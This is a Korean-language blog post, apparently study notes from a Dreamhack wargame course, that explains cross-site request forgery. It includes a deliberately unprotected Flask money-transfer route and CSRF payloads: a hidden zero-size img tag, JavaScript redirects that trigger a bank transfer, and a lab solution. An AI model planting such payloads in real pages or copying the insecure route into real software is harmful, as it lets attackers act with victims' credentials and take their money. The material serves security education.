---
layout : single
title : "STAGE5. Cross Site Request Forgery"
categories: Security
tag: [dreamhack, webhacking, wargame]
sidebar:
    nav: "docs"
---
# 드림핵 웹 Cross Site Request Forgery (CSRF)
이용자의 신원 정보가 포함된 쿠키는 서명과 같은 역할을 함 (이용자가 문서의 내용에 동의했다). 따라서, 이용자의 식별 정보가 포함된 쿠키는 클라이언트의 요청이 이용자로부터 왔으며, 이를 이용자가 동의했고, 요청에 이용자의 권한이 부여되어야함을 의미한다.<br><br>
XXS는 서명을 날조하는 공격에 대응되며, CSRF(교차 사이트 요청 위조)는 이미 서명된 문서를 위조하는 것에 대응된다. 조작된 문서의 내용이 서명으로 인해 효력을 가지게 되는 것을 뜻한다. CSRF는 이러한 방식으로 이용자를 속여서 의도치 않은 요청에 동의하도록 한다.

## CSRF
임의 이용자의 권한으로 임의 주소에 HTTP 요청을 보낼 수 있는 취약점으로, 공격자는 임의 이용자의 권한으로 서비스를 이용해 이득을 취할 수 있다. (금전적인 이득, 혼란 야기)
<br><br>

**이용자의 송금 요청*

```http
GET /sendmoney?to=dreamhack&amount=1337 HTTP/1.1
Host: bank.dreamhack.io
Cookie: session=IeheighaiToo4eenahw3
```

**CSRF 취약점이 존재하는 예제 코드*

```python
# 이용자가 /sendmoney에 접속했을때 아래와 같은 송금 기능을 웹 서비스가 실행함.
@app.route('/sendmoney')
def sendmoney(name):
    # 송금을 받는 사람과 금액을 입력받음.
    to_user = request.args.get('to')
	amount = int(request.args.get('amount'))
	
	# 송금 기능 실행 후, 결과 반환	
	success_status = send_money(to_user, amount)
	
	# 송금이 성공했을 때,
	if success_status:
	    # 성공 메시지 출력
		return "Send success."
	# 송금이 실패했을 때,
	else:
	    # 실패 메시지 출력
		return "Send fail."
```
위 코드는 이용자로부터 예금주와 금액을 입력받고, 계좌의 비밀번호 또는 OTP 등의 사용 없이 송금을 수행한다. 따라서, 로그인한 사용자는 추가 인증 정보 없이 해당 기능을 사용할 수 있다.

### CSRF 동작
공격에 성공하기 위해서는 공격자의 악성 스크립트(HTTP 요청을 전송하는 코드)를 이용자가 실행해야하며, 이는 메일또는 게시판의 글을 통해 이용자가 이를 조회하도록 유도하는 방법이 있다. <br><br>

#### HTML

\* img 태그를 사용한 스크립트의 예로, 이미지의 크기를 줄일 수 있는 옵션을 제공하여 임의 페이지에 요청을 보내도록 한다
```html
<img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>
```

\* img 또는 form 태그를 사용하면 HTTP 헤더인 Cookie에 이용자의 인증 정보가 포함됨
```html
<img src='https://test.dreamhack.io/main-long.png'>
```

```html
<form action="https://test.dreamhack.io/users/1" method="post">
    <input name = "user">
    <input name = "pass">
    <input type = "submit">
</form>
```

#### JavaScript

```javascript
/* 새 창 띄우기 */
window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
/* 현재 창 주소 옮기기 */
location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
```

### 실습
-  [x]  XSS 발생 예시와 종류<br>
Javascript 실행이 제한된 모듈에서, HTML 태그를 통해 계좌 잔고를 1000000원 이상으로 늘려보세요<br>

>>```html
<img src="/sendmoney?to=dreamhack&amount=1337">
```

>><img src="/images/webbackground/7.png">